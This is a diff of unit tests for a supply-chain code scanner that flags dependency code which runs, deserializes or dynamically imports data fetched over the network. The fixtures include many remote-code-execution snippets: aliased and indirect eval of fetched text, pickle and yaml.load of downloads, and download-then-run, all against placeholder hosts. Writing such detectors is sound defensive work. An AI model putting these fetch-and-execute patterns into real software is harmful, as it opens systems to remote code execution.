@@ -131,6 +131,80 @@ RECEIVED = [
     ("a -c program that downloads and runs",
      "import subprocess, sys\nsubprocess.run([sys.executable, '-c', 'import urllib.request as u; "
      "exec(u.urlopen(\"https://files.invalid/p\").read())'])\n", 2),
+    # runner aliases: a name bound to a runner, called on a received value near
+    # its definition (a call far from the definition is not one — see NOT_RECEIVED)
+    ("eval aliased", "const e = eval;\nconst code = await (await fetch(" + U + ")).text();\ne(code);\n", 3),
+    ("eval aliased, same line", "const e = eval; e(await (await fetch(" + U + ")).text());\n", 1),
+    ("os.system aliased", "import os, requests\ns = os.system\ns(requests.get(" + U + ").text)\n", 3),
+    ("execSync aliased from require", "const ex = require('child_process').execSync;\n"
+     "ex(await (await fetch(" + U + ")).text());\n", 2),
+    # eval / Function reached indirectly
+    ("indirect (0, eval)", "const code = await (await fetch(" + U + ")).text();\n(0, eval)(code);\n", 2),
+    ("indirect eval.call", "const code = await (await fetch(" + U + ")).text();\neval.call(null, code);\n", 2),
+    ("indirect eval.bind", "const code = await (await fetch(" + U + ")).text();\neval.bind(null)(code);\n", 2),
+    ("indirect window['eval']", "const code = await (await fetch(" + U + ")).text();\nwindow['eval'](code);\n", 2),
+    ("indirect self['eval']", "const code = await (await fetch(" + U + ")).text();\nself[\"eval\"](code);\n", 2),
+]
+
+# deserialization of a received value: runs code embedded in it (CWE-502)
+DESERIALIZE = [
+    ("pickle.loads of a download", "import pickle, urllib.request\npickle.loads(urllib.request.urlopen(" + U
+     + ").read())\n", 2),
+    ("pickle.loads of requests", "import pickle, requests\npickle.loads(requests.get(" + U + ").content)\n", 2),
+    ("pickle via a bound name", "import pickle, requests\nblob = requests.get(" + U + ").content\n"
+     "pickle.loads(blob)\n", 3),
+    ("marshal.loads", "import marshal, requests\nmarshal.loads(requests.get(" + U + ").content)\n", 2),
+    ("yaml.load without a safe loader", "import yaml, requests\nyaml.load(requests.get(" + U + ").text)\n", 2),
+    ("node-serialize unserialize", "const s = require('node-serialize');\n"
+     "s.unserialize(await (await fetch(" + U + ")).text());\n", 2),
+]
+
+# a module named by a received value, loaded dynamically
+DYNIMPORT = [
+    ("import(received)", "const name = await (await fetch(" + U + ")).text();\nawait import(name);\n", 2),
+    ("require(received)", "const name = await (await fetch(" + U + ")).text();\nrequire(name);\n", 2),
+    ("importlib.import_module(received)", "import importlib, requests\nmod = requests.get(" + U + ").text\n"
+     "importlib.import_module(mod)\n", 3),
+    ("__import__(received)", "import requests\n__import__(requests.get(" + U + ").text)\n", 2),
+]
+
+# a received value written to a file that is then run (MAJOR only: import-time,
+# never an install-script escalation)
+DOWNLOAD_RUN = [
+    ("write then run with the interpreter", "import requests, subprocess, sys\ndata = requests.get(" + U
+     + ").content\nopen('x.py', 'wb').write(data)\nsubprocess.run([sys.executable, 'x.py'])\n", 4),
+    ("writeFileSync then require", "const body = await (await fetch(" + U + ")).text();\n"
+     "fs.writeFileSync('m.js', body);\nrequire('./m.js');\n", 3),
+    ("urlretrieve then run", "import urllib.request, subprocess\n"
+     "urllib.request.urlretrieve('http://files.invalid/t', 'tool.py')\nsubprocess.run(['python', 'tool.py'])\n", 3),
+    ("pipe to a write stream then fork", "const https = require('https');\n"
+     "https.get(" + U + ", (r) => r.pipe(fs.createWriteStream(dst)));\nfork(dst);\n", 3),
+    ("os.system of the dropped path", "import os, requests\nd = requests.get(" + U + ").content\n"
+     "open('r.sh', 'wb').write(d)\nos.system('r.sh')\n", 4),
+]
+
+# deserialization / dynamic import that is NOT of a received value, and
+# download-to-file shapes that must not fire
+NOT_DESERIALIZE = [
+    ("pickle of a local file", "import pickle\nwith open('m.pkl', 'rb') as f:\n    data = pickle.loads(f.read())\n"),
+    ("yaml with a safe loader", "import yaml, requests\nyaml.load(requests.get(u).text, Loader=yaml.SafeLoader)\n"),
+    ("safe_load of a download", "import yaml, requests\nyaml.safe_load(requests.get(u).text)\n"),
+    ("JSON.parse of a download", "const res = await fetch(u);\nconst data = JSON.parse(await res.text());\n"),
+]
+NOT_DYNIMPORT = [
+    ("a literal import", "const mod = await import('./local.js');\n"),
+    ("require of a literal", "const fs = require('fs');\nconst r = await fetch(u);\n"),
+    ("import_module of a config value", "import importlib\nname = config['plugin']\nimportlib.import_module(name)\n"),
+    ("a Python from-import list", "import requests\nfrom urllib import (urlretrieve, quote, unquote)\n"
+     "r = requests.get(u)\n"),
+]
+NOT_DOWNLOAD_RUN = [
+    ("written but not run", "const body = await (await fetch(u)).text();\nfs.writeFileSync('cache.json', body);\n"),
+    ("run but not downloaded", "fs.writeFileSync('x.js', localData);\nrequire('./x.js');\n"),
+    ("a different file is run", "const body = await (await fetch(u)).text();\nfs.writeFileSync('data.bin', body);\n"
+     "require('./app.js');\n"),
+    ("a runner alias far from its definition",
+     "const F = Function;\n" + "// spacer\n" * 60 + "const code = await (await fetch(u)).text();\nF(code);\n"),
 ]
 
 NOT_RECEIVED = [
@@ -220,6 +294,70 @@ class ReceivedCodeTests(unittest.TestCase):
         issue = core.dependency_import_issue("site-packages/trapdoor_py/__init__.py", text)
         self.assertEqual((issue["rule"], issue["sev"], issue["line"]), ("SC-IMPORT-RISK", "MAJOR", 3))
         self.assertEqual(issue["msg"], f"Dependency code {REASON}.")
+
+    DESERIAL_REASON = "deserializes data it receives over the network"
+    IMPORT_REASON = "loads a module named by data it receives over the network"
+    DROP_REASON = "downloads a file and then runs it"
+
+    def test_deserialization_of_a_received_value(self):
+        for label, text, line in DESERIALIZE:
+            with self.subTest(label):
+                self.assertEqual(core.runs_received_code(text), line)
+                reasons, at = core.import_time_risk(text)
+                self.assertIn(self.DESERIAL_REASON, reasons)
+                self.assertEqual(at, line)
+                self.assertIn(self.DESERIAL_REASON, core.install_script_risk(text))     # CRITICAL in an install script
+        for label, text in NOT_DESERIALIZE:
+            with self.subTest(label):
+                self.assertNotIn(self.DESERIAL_REASON, core.import_time_risk(text)[0])
+                self.assertNotIn(self.DESERIAL_REASON, core.install_script_risk(text))
+
+    def test_dynamic_import_of_a_received_specifier(self):
+        for label, text, line in DYNIMPORT:
+            with self.subTest(label):
+                self.assertEqual(core.runs_received_code(text), line)
+                reasons, at = core.import_time_risk(text)
+                self.assertIn(self.IMPORT_REASON, reasons)
+                self.assertEqual(at, line)
+                self.assertIn(self.IMPORT_REASON, core.install_script_risk(text))
+        for label, text in NOT_DYNIMPORT:
+            with self.subTest(label):
+                self.assertNotIn(self.IMPORT_REASON, core.import_time_risk(text)[0])
+                self.assertNotIn(self.IMPORT_REASON, core.install_script_risk(text))
+
+    def test_download_to_file_is_major_only(self):
+        for label, text, line in DOWNLOAD_RUN:
+            with self.subTest(label):
+                # a MAJOR import-time signal, on its line
+                reasons, at = core.import_time_risk(text)
+                self.assertIn(self.DROP_REASON, reasons)
+                self.assertEqual(at, line)
+                # and never an install-script escalation, nor a received-code "run"
+                self.assertNotIn(self.DROP_REASON, core.install_script_risk(text))
+                self.assertEqual(core.install_script_risk(text), [])
+        for label, text in NOT_DOWNLOAD_RUN:
+            with self.subTest(label):
+                self.assertNotIn(self.DROP_REASON, core.import_time_risk(text)[0])
+
+    def test_new_sinks_stay_bounded(self):
+        # texts built to make the new sinks work, about 100-900 KB each
+        shapes = {
+            "alias defs": "".join(f"const a{i} = eval;\n" for i in range(6000)) + "a1(fetch(u));\n",
+            "alias calls": "const e = eval;\n" + ("e(" * 400 + "\n") * 200 + "x = fetch(u)\n",
+            "pickle nests": "import pickle\n" + "pickle.loads(" * 4000 + "requests.get(u).content" + ")" * 4000 + "\n",
+            "require calls": "fetch(u);\n" + ("require(" * 300 + "\n") * 200,
+            "import calls": ("import(" * 300 + "\n") * 200 + "fetch(u)\n",
+            "writes and runs": "".join(f"open('w{i}','wb').write(requests.get(u).content); os.system('r{i}')\n"
+                                       for i in range(8000)),
+            "urlretrieve spam": "".join(f"urllib.request.urlretrieve(u, 'f{i}')\nsubprocess.run(['python', 'f{i}'])\n"
+                                        for i in range(4000)),
+        }
+        start = time.monotonic()
+        for label, text in shapes.items():
+            with self.subTest(label):
+                core.runs_received_code(text)
+                core.import_time_risk(text)
+        self.assertLess(time.monotonic() - start, 20)
 
     def test_bounded_work(self):
         # texts built to make the follower work, about 200 KB each: many
